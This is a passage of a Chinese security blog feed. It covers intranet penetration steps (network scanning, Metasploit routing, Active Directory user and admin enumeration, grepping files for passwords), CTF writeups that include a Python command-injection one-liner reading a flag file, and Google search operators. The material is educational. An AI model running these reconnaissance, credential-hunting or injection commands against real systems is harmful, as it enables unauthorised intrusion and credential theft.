c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;20)&quot; &gt;&gt; c:\windows\temp\log.txt</span><br><span class="line">type c:\windows\temp\log.txt</span><br><span class="line">        </span><br><span class="line">通过常规的TCP&#x2F;UDP端口扫描探测内网</span><br><span class="line">上传ScanLine进行扫描：</span><br><span class="line">scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><h2 id="3-扫描域内端口"><a href="#3-扫描域内端口" class="headerlink" title="3.扫描域内端口"></a>3.扫描域内端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">telnet(但是这个速度太慢了点)</span><br><span class="line"></span><br><span class="line">Metasploit端口扫描:</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set ports 1-1000</span><br><span class="line">set RHOST 192.168.1.1</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br><span class="line">        </span><br><span class="line">PowerSploit、NiShang的Invoke-portscan脚本</span><br><span class="line"></span><br><span class="line">注：msf记得添加路由或代理</span><br><span class="line">autoroute添加路由</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0&#x2F;24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line">                      </span><br><span class="line">当然msf不止有扫描端口的脚本，这里在列举几个其他脚本：</span><br><span class="line"> 1. use auxiliary&#x2F;scanner&#x2F;http&#x2F;dir_scanner</span><br><span class="line"> 2. use auxiliary&#x2F;scanner&#x2F;http&#x2F;jboss_vulnscan</span><br><span class="line"> 3. use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br><span class="line"> 4. use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version</span><br><span class="line"> 5. use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_login</span><br><span class="line">&#x2F;&#x2F;扫描的脚本位于：</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-收集域内基础信息"><a href="#4-收集域内基础信息" class="headerlink" title="4. 收集域内基础信息"></a>4. 收集域内基础信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain&#x2F;&#x2F;查询域</span><br><span class="line">net view &#x2F;domain:test&#x2F;&#x2F;查询域内所有计算机</span><br><span class="line">net group &#x2F;domain&#x2F;&#x2F;查询域内所有用户组列表 </span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain&#x2F;&#x2F;查询所有域成员计算机列表</span><br><span class="line">net accounts &#x2F;domain&#x2F;&#x2F;获取域内密码信息</span><br><span class="line">nltest &#x2F;domain_trusts&#x2F;&#x2F;域内信任信息</span><br></pre></td></tr></table></figure><h2 id="5-查找域控"><a href="#5-查找域控" class="headerlink" title="5. 查找域控"></a>5. 查找域控</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:test</span><br><span class="line"></span><br><span class="line">net time &#x2F;domain</span><br><span class="line">  </span><br><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br><span class="line">  </span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line">  </span><br><span class="line">netdom query pdc&#x2F;&#x2F;查看主控制器</span><br></pre></td></tr></table></figure><h2 id="6-获取域内的用户和管理员信息"><a href="#6-获取域内的用户和管理员信息" class="headerlink" title="6. 获取域内的用户和管理员信息"></a>6. 获取域内的用户和管理员信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查询所有域用户列表</span><br><span class="line">net user &#x2F;domain </span><br><span class="line">&#x2F;&#x2F;获取域内用户的详细信息</span><br><span class="line">wmic useraccount get &#x2F;all </span><br><span class="line">&#x2F;&#x2F;查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在</span><br><span class="line">dsquery user </span><br><span class="line">&#x2F;&#x2F;查找目录中的计算机</span><br><span class="line">dsquery computer </span><br><span class="line">&#x2F;&#x2F;查询本地管理员组用户</span><br><span class="line">net localgroup administrators </span><br><span class="line">&#x2F;&#x2F;查询域管理员用户组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain </span><br><span class="line">&#x2F;&#x2F;查询管理员用户组</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><h2 id="7-定位域管理员"><a href="#7-定位域管理员" class="headerlink" title="7. 定位域管理员"></a>7. 定位域管理员</h2><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统/主机的本地管理员，以及所属组等关键信息。 这里直接用前辈们造的轮子吧，能够使用的轮子有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe</span><br><span class="line">&#x2F;&#x2F;能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态        </span><br><span class="line">下载地址：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;psloggedon</span><br><span class="line">使用：psloggedon.exe \\dc2012</span><br><span class="line">  </span><br><span class="line">PVEFindADUser</span><br><span class="line">&#x2F;&#x2F;PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：https:&#x2F;&#x2F;www.cr173.com&#x2F;soft&#x2F;921507.html</span><br><span class="line">下载地址：https:&#x2F;&#x2F;github.com&#x2F;chrisdee&#x2F;Tools&#x2F;tree&#x2F;master&#x2F;AD&#x2F;ADFindUsersLoggedOn</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">        </span><br><span class="line">NetView</span><br><span class="line">&#x2F;&#x2F;NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</span><br><span class="line">下载地址：https:&#x2F;&#x2F;github.com&#x2F;mubix&#x2F;netview</span><br><span class="line">           </span><br><span class="line">PowerView</span><br><span class="line">使用Powerview的Invoke-UserHunter。</span><br><span class="line">            </span><br><span class="line">Empire</span><br><span class="line">&#x2F;&#x2F;Empire中也存在此类型的脚本：</span><br><span class="line">usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter</span><br><span class="line">execute</span><br><span class="line">            </span><br><span class="line">Nmap的NSE脚本</span><br><span class="line">&#x2F;&#x2F;通过Nmap的NSE脚本获取远程机器的登陆会话。</span><br><span class="line">smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;smb-enum-sessions.html</span><br><span class="line">smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</span><br><span class="line">smb-enum-users.nse可以使用此脚本对域控进行扫描。</span><br></pre></td></tr></table></figure><h2 id="8-查找域管理进程"><a href="#8-查找域管理进程" class="headerlink" title="8. 查找域管理进程"></a>8. 查找域管理进程</h2><blockquote><p>参考文章：<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">本机检查：</span><br><span class="line">&#x2F;&#x2F;获取域管理员列表</span><br><span class="line">net group &quot;Domain Admins&quot; &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;列出本机的所有进程和进程用户</span><br><span class="line">tasklist &#x2F;v</span><br><span class="line">&#x2F;&#x2F;查询域控的域用户会话</span><br><span class="line">&#x2F;&#x2F;查询域控列表</span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;收集所有活动域的会话列表</span><br><span class="line">netsess -h</span><br></pre></td></tr></table></figure><h2 id="9-补充一点linux信息收集姿势"><a href="#9-补充一点linux信息收集姿势" class="headerlink" title="9. 补充一点linux信息收集姿势"></a>9. 补充一点linux信息收集姿势</h2><p>常见的配置文件有那些？有没有可攻击的插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Cat &#x2F;etc&#x2F;syslog.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;chttp.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;lighttpd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;http&#x2F;conf&#x2F;http.conf</span><br><span class="line">Cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf</span><br><span class="line">Ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.r.&#x2F;</span><br></pre></td></tr></table></figure><p>查找系统内跟用户名和密码的有关的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Grep -I user [filename]</span><br><span class="line">grep -i pass [filename] grep -C 5 “password” [filename] find . -name “*.php” -print0 | xargs     -0 grep -i -n “var $password” # Joomla</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2020</title>
      <link href="2020/08/27/2020CISCN/"/>
      <url>2020/08/27/2020CISCN/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3918734606.png"></p><h2 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h2><p>**<a href="https://pan.baidu.com/s/1mSXQsRcgdK17-Aq6aTAFOw">附件</a>**（提取码：kkgs）</p><p>仔细观察即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2828207989.png"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><blockquote><p>题目描述：nc 101.200.53.148 13465</p></blockquote><p>非预期解（不看附件<br> <code>__import__(&#39;os&#39;).system(&#39;cat home/ctf/flag&#39;) </code></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>**<a href="https://pan.baidu.com/s/1hORDV0NR-6wzWfJGYpny_Q">附件</a>**（提取码：v02b）</p><p>转十进制，解五组方程组（仅举一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12094&#x3D;34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59</span><br><span class="line">25270&#x3D;27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59</span><br><span class="line">19330&#x3D;24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59</span><br><span class="line">18540&#x3D;78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59</span><br><span class="line">16386&#x3D;48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59</span><br><span class="line">21207&#x3D;15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59</span><br><span class="line">11759&#x3D;26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59</span><br></pre></td></tr></table></figure><p>sage一把梭哈<br><strong><a href="https://sagecell.sagemath.org/">sage在线工具</a>/<a href="https://pan.baidu.com/s/1bIiICAdaEEW-6IzQkXLiuw">sage</a>（提取码：cbgy）</strong><br>具体操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var(&#39;v53,v54,v55,v56,v57,v58,v59&#39;)</span><br><span class="line"></span><br><span class="line">s1 &#x3D; 12094 &#x3D;&#x3D; 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59</span><br><span class="line"></span><br><span class="line">s2 &#x3D; 25270 &#x3D;&#x3D; 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59</span><br><span class="line"></span><br><span class="line">s3 &#x3D; 19330 &#x3D;&#x3D; 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59</span><br><span class="line"></span><br><span class="line">s4 &#x3D; 18540 &#x3D;&#x3D; 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59</span><br><span class="line"></span><br><span class="line">s5 &#x3D; 16386 &#x3D;&#x3D; 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59</span><br><span class="line"></span><br><span class="line">s6 &#x3D; 21207 &#x3D;&#x3D; 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59</span><br><span class="line"></span><br><span class="line">s7 &#x3D; 11759 &#x3D;&#x3D; 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59</span><br><span class="line"></span><br><span class="line">solve([s1,s2,s3,s4,s5,s6,s7],v53,v54,v55,v56,v57,v58,v59)</span><br></pre></td></tr></table></figure><p>以此类推，得到结果：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/206246459.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2953166153.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1305928255.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1102886100.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2195107022.png"></p><p>组合以上结果，解密得到flag：flag{7e171d43-63b9-4e18-990e-6e14c2afe648}<br>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in flag:</span><br><span class="line">  s+&#x3D;chr(i)</span><br><span class="line">print s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF八月七夕战 2020</title>
      <link href="2020/08/25/2020DASCTF%E5%85%AB%E6%9C%88%E4%B8%83%E5%A4%95%E6%88%98/"/>
      <url>2020/08/25/2020DASCTF%E5%85%AB%E6%9C%88%E4%B8%83%E5%A4%95%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>B站直播屏幕即可看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2257995176.png"></p><h2 id="标错的字符"><a href="#标错的字符" class="headerlink" title="标错的字符"></a>标错的字符</h2><p>**<a href="https://pan.baidu.com/s/1wC-8KiRG-yRpb4m0o6bVqw">附件</a>**（提取码：0ui9）</p><p>根据附件所给说明找出错误的七个（很明显有规律，然后md5加密即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2150377646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3820778284.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF七月赛 2020</title>
      <link href="2020/07/25/2020DASCTF%E4%B8%83%E6%9C%88%E8%B5%9B/"/>
      <url>2020/07/25/2020DASCTF%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4154306512.png"></p><h2 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h2><p><a href="https://pan.baidu.com/s/1-rRpfNzFPJbdEFzFWhm4Jw"><strong>附件</strong></a>（提取码：2bc3）</p><p>一张图片，一个加密的包，很明显我们需要通过这张图片来解出压缩包的密码</p><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>使用工具steg，根据名字锁定是红和蓝，在尝试之后只有red才显示是png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3327796181.png"></p><h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>使用zsteg进行分析从而得到密码<br>kali安装zstep步骤 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zsteg</span><br><span class="line">cd zsteg&#x2F;</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>接着，输入命令： <code>zsteg&gt;zsteg red_blue.png</code><br>发现有个png，于是将它提取出来： <code>zsteg red_blue.png -e &#39;b1,r,lsb,xy&#39; &gt; pass.png</code> </p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2160594035.png"></p><p>最终成功得到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1309543423.png"></p><p>这里还是老规矩千万不要去解压它！不然关键的文档将会不见（不要问我为什么，我也不知道.jpg）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/435545863.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2618965096.png"></p><p>最后base85解码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1239092664.png"></p><h2 id="QrJoker"><a href="#QrJoker" class="headerlink" title="QrJoker"></a>QrJoker</h2><p><a href="https://pan.baidu.com/s/1VF5sfPiJi_nUMeNNeyH-AQ"><strong>附件</strong></a>（提取码：iwff）</p><h4 id="解法一（写不来脚本"><a href="#解法一（写不来脚本" class="headerlink" title="解法一（写不来脚本~"></a>解法一（写不来脚本~</h4><p>脚本一把梭哈，具体见：<a href="http://www.fzwjscj.xyz/index.php/archives/36/">http://www.fzwjscj.xyz/index.php/archives/36/</a></p><h4 id="解法二（图片过多，身为蓝狗的我自然就"><a href="#解法二（图片过多，身为蓝狗的我自然就" class="headerlink" title="解法二（图片过多，身为蓝狗的我自然就~"></a>解法二（图片过多，身为蓝狗的我自然就~</h4><p>首先将gif中的64张保存下来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1254607035.png"></p><p>接着，使用在线工具：<a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><p>具体操作可见：<br><a href="http://blog.falsectf.top/page/e0a8211b.html#toc-heading-3">http://blog.falsectf.top/page/e0a8211b.html#toc-heading-3</a></p><p><a href="https://www.cnblogs.com/Mercurysur/p/13378407.html#Q6T72KP7">https://www.cnblogs.com/Mercurysur/p/13378407.html#Q6T72KP7</a></p><h2 id="bullshit"><a href="#bullshit" class="headerlink" title="bullshit"></a>bullshit</h2><p><a href="https://pan.baidu.com/s/1FEXhfEaeLaHbbv4UCQNUEA"><strong>附件</strong></a>（提取码：ynpw）</p><p>依次对明文两个字符一组进行加密，关键点是把密文对应的组分开，看一下pairing函数的返回值。明文的字符范围应该是0-9_A-Z_a-z_{}，其中最大的ascii数值是125，返回值最大不超过16000，最小大于2000，根据这个可以分割密文对应明文段，然后爆破出对应明文即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def pairing(a,b):</span><br><span class="line">shell &#x3D; max(a, b)</span><br><span class="line">step &#x3D; min(a, b)</span><br><span class="line">if step &#x3D;&#x3D; b:</span><br><span class="line">    flag &#x3D; 0</span><br><span class="line">else:</span><br><span class="line">    flag &#x3D; 1</span><br><span class="line">return shell ** 2 + step * 2 + flag</span><br><span class="line"></span><br><span class="line">text &#x3D; &#39;11869 10804 15229 10199 3354 10105 3241 10519 9908 2499 10505 10103 9519 9519 3232 9711 9520 3127 15722&#39;</span><br><span class="line"></span><br><span class="line">def decrypt(a):</span><br><span class="line">for i in range(255):</span><br><span class="line">    for j in range(255):</span><br><span class="line">        if pairing(i,j) &#x3D;&#x3D; a:</span><br><span class="line">            return i,j</span><br><span class="line">a &#x3D; text.split()</span><br><span class="line">l1 &#x3D; []</span><br><span class="line">for i in a:</span><br><span class="line">  if decrypt(int(i)):</span><br><span class="line">    m,n &#x3D; decrypt(int(i))</span><br><span class="line">    l1.append(m)</span><br><span class="line">    l1.append(n)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in l1:</span><br><span class="line">  flag +&#x3D; chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><blockquote><p>web的题目我也没做上就不写了（就算做了也不会.jpg），不过也可以看各位师傅的博客，比如：<a href="https://www.gem-love.com/ctf/2514.html">Y1ng师傅</a>、<a href="https://nop-sw.github.io/wiki/wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/">hshui师傅</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google信息搜集语法利用</title>
      <link href="2020/07/11/Google%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%AF%AD%E6%B3%95%E5%88%A9%E7%94%A8/"/>
      <url>2020/07/11/Google%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%AF%AD%E6%B3%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>一、site，指定搜索的某個網站。例：desire site:bbs.gfan.com</p><p>二、filetype，指定搜索的文件類型。例：seo filetype:doc</p><p>三、双引号，代表完全匹配，使关键词不分开，顺序都不能变。</p><p>四、减号，事搜索结果更准确。减号与前一个关键词之间一定要有一个空格，与后一个关键词之间一定不能有空格。搜索结果为，匹配前一个关键词但不匹配后一个关键词的结果。例如：seo -搜索引擎。</p><p>五、AND，逻辑与，这个命令我们其实一直都在用，只是没有意识到。一般用空格代替，还可以用“+”代替。例如：霹雳布袋+败亡之剑，返回的结果同时包含两者。</p><p>六、intitle，在结果的标题中包含关键词，一次只能搜索一个关键词。</p><p>七、inurl，返回的结果的url中包含关键词。例如：seo inurl:byr，它将返回网址中包含byr，而内容中包含搜索词的结果。一次只能搜索一个关键词。</p><p>八、allintitle，在结果的标题中同时包含多个关键词。例如：allintitle:seo 搜索引擎，起作用相当于intitle:seo intitle:搜索引擎。allintitle属于排他性指令，不能与其他指令结合使用。</p><p>九、allinurl，结果的url中包含多个关键词。例如：allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令</p><p>十、define，查询关键词的词义，起的是字典的作用。Google会返回包含查询关键词定义的网页，例如：define:computer ，支持汉字哦！</p><p>十一、xx in yy，单位换算，xx和yy代表需要换算的单位，且xx和yy为单位的英文缩写。例如你想知道一盎司等于多少千克，只需输入：1 oz in kg。</p><p>十二、weather，查询某一地区或城市的天气。不过我们这一地区或城市必须是Google能识别的，例如：weather:beijing，Google将会给我们返回北京的天气。</p><p>十三、intext，在结果的正文内容中包含关键词。例如：intext:剑圣，所有返回的网页正文中都包含“剑圣”。</p><p>十四、allintext，在结果的正文内容中同时包含多个关键词。排他性指令。</p><p>十五、星号（<em>），通配符，可以匹配任意字符串。例如：搜索</em>擎，则返回的结果中不仅有“搜索引擎”，还有“搜索巨擎”之类的。</p><p>十六、“..”，表示数值范围。例如：手机 2000..3000 元，注意“3000”与“元”之间必须有空格。另外，也可以是三个点。</p><p>十七、OR，逻辑或，可以用“|”代替。例如：霹雳布袋|败亡之剑，则返回的结果中，要么只含有“霹雳布袋”，要么就只含有“败亡之剑”，不可能是同时包含两个关键词的网页。</p><p>十八、info，查询网站的一些信息。例如：info:bbs.byr.cn，它只会返回一个结果，是一个选择列表，列表的选项是这个网站的某一方面的信息。info=cache+related+link+site+intext+intitle。</p><p>十九、related，查询与所给的网站类似的网站，它会返回Google认为的可能和你提供的网站类似的其他网站。例如：related:bbs.gfan.com，会返回安卓巴士，eoe社区，91等站点，但不会返回机锋网。其实这个命令Google经常在用，比如我们搜一个东西，Google除了返回给我结果，还会在结果下面给我们返回一些相关的词条。</p><p>二十、link，查询链接到这个url的页面。例如：link:bbs.gfan.com，会返回机锋网的所有外部链接。从其他页面指向机锋。</p><p>二十一、linkdomain，查询这个url链接的页面。例如：linkdomain:bbs.gfan.com 